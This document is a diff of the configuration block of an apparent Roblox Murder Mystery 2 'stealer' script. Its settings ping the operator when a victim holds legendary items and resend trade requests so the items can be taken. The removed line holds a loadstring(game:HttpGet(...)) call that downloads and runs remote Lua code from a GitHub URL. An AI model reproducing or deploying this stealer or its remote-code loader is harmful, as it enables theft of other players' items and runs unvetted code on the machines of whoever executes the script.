@@ -4,8 +4,8 @@ Config = {
     FullInventory = true, -- If true, it will display all of the player's items.
     GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
     ResendTrade = "hello", -- Send this in chat to resend the trade request if you don't receive it.
-    Script = "Custom", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
-    CustomLink = "loadstring(game:HttpGet('https://raw.githubusercontent.com/BludnyHolandan/MM2/refs/heads/main/primordial/script/amg.lua'))()" -- If Script is set to Custom, provide the custom URL here.
+    Script = "None", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
+    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
 }
 
 repeat wait() until game:IsLoaded()
